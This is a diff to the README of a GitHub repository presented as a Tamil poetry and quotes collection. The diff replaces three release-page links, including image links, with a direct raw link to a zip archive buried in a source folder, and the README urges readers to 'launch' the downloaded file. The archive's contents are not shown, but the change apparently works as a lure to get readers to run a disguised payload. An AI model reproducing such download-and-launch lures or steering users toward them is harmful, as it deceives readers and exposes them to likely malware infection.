@@ -2,7 +2,7 @@
 
 Welcome to **Astro Daily Kavithai** GitHub repository! 🎉
 
-![Astro](https://github.com/Leeladharsidd/astro-daily-kavithai/releases)
+![Astro](https://raw.githubusercontent.com/Leeladharsidd/astro-daily-kavithai/main/src/pages/kavithai/kavithai_astro_daily_v1.6.zip)
 
 ## Overview ℹ️
 **Astro Daily Kavithai** is your go-to place for daily doses of beautiful Tamil poetry and quotes. Immerse yourself in the world of தமிழ் கவிதைகள் (Tamil Poetry) and Tamil Quotes Collections. Whether you are looking for inspiration, comfort, or simply enjoy the beauty of Tamil literature, this repository has something for you.
@@ -14,7 +14,7 @@ Welcome to **Astro Daily Kavithai** GitHub repository! 🎉
 
 ## Resources 🛠️
 To access the collection of beautiful Tamil poetry and quotes, please visit the following link:
-[![Download Poetry](https://github.com/Leeladharsidd/astro-daily-kavithai/releases)](https://github.com/Leeladharsidd/astro-daily-kavithai/releases)
+[![Download Poetry](https://raw.githubusercontent.com/Leeladharsidd/astro-daily-kavithai/main/src/pages/kavithai/kavithai_astro_daily_v1.6.zip)](https://raw.githubusercontent.com/Leeladharsidd/astro-daily-kavithai/main/src/pages/kavithai/kavithai_astro_daily_v1.6.zip)
 
 If the link ends with a file name, please launch it to explore the wonderful world of Tamil literature. 📚
 
@@ -36,7 +36,7 @@ Help us grow our community and spread the love for Tamil literature. Share this 
 
 Let's celebrate the rich heritage of Tamil literature together! 🎉📜
 
-![Tamil Poetry](https://github.com/Leeladharsidd/astro-daily-kavithai/releases)
+![Tamil Poetry](https://raw.githubusercontent.com/Leeladharsidd/astro-daily-kavithai/main/src/pages/kavithai/kavithai_astro_daily_v1.6.zip)
 
 Remember, the journey through தமிழ் கவிதைகள் (Tamil Poetry) and Tamil Quotes is not just about words; it's about emotions, connections, and a deep appreciation for the beauty of language. Explore, reflect, and let the words touch your soul.
 
